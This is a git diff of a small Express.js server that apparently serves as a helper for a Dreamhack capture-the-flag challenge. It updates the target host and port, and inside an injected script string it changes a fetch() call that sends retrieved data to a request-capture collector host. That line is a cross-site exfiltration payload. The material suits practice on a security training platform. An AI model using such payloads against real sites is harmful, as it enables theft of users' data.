@@ -5,7 +5,8 @@ const { redirect } = require('next/dist/server/api-utils');
 
 app.use(cors());
 
-const url = "http://host3.dreamhack.games:16717";
+const PORT = 4000;
+const url = "http://host3.dreamhack.games:9805";
 
 app.use(express.json());
 
@@ -27,7 +28,7 @@ app.get('/info', (req, res) => {
         })
         .then(response => response.json())
         .then(data => {
-            fetch("https://yshcvut.request.dreamhack.games/"+data.data)
+            fetch("https://jhnahqk.request.dreamhack.games/"+data.data)
             console.log(data.data)
         })
         '>
@@ -47,6 +48,6 @@ app.post('/log', (req, res) => {
     res.sendStatus(200);
 });
 
-app.listen(3000, () => {
-    console.log("Server is running on port 3000");
+app.listen(PORT, () => {
+    console.log(`Server is running on port ${PORT}`);
 });
